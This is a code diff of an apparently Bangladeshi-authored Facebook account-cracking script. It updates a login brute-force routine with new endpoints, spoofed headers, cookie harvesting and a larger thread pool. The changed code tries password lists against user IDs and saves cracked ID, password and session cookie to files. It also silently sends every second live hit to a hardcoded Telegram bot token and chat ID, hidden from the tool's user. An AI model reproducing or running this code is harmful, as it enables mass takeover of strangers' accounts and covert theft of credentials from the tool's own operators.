@@ -1129,7 +1129,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=20) as SUMON_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -1751,45 +1751,63 @@ def mbasic(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M1==SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(M4-ATOM) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://www.facebook.com/').text
             data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":'',
-            "li":'',
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":pw,
-            "login":"Log In"}
-            headers = {
-            'Host': 'touch.facebook.com',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'pass': pw,
+            'timezone': '-330',
+            'lgndim': re.search('name="lgndim" value="(.*?)"', str(free_fb)).group(1),
+            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(free_fb)).group(1),
+            'lgnjs': re.search('name="lgnjs" value="(.*?)"', str(free_fb)).group(1),
+            'ab_test_data': '',
+            'locale': 'en_GB',
+            'next': 'https://www.facebook.com/?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'login_source': 'login_bluebar',
+            'guid': '',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',}
+            headers ={
+            'Host': 'www.facebook.com',
+            'method': 'POST',
+            'path': '/login/Device-based/login/async/',
+            'scheme': 'https',
+            'content-length': '294',
+            'Accept-Encoding': 'gzip',
+            'content-Length': '{len(str(logn_data))}',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'dpr': '1.75',
+            'viewport-width': '980',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '',
+            'sec-ch-prefers-color-scheme': 'light',
             'upgrade-insecure-requests': '1',
-            'origin': 'https://touch.facebook.com',
-            'content-type': 'application/x-www-form-urlencoded',
             'user-agent': ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'x-requested-with': 'XMLHttpRequest',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://touch.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'connection': 'close'}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'dnt': '1',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'x-requested-with': 'mark.via.gp',
+            'sec-fetch-site': 'none',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1798,27 +1816,21 @@ def mbasic(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                       statusok = (f"{cid}|{pw}|{coki}")
+                       requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                       print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                       #print(f" {green}Cookie : {green}{coki}")
+                       open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                       oks.append(cid)
+                    break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1830,6 +1842,7 @@ def mbasic(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
+
 
 def p(uid,pwx,tl):
     global oks
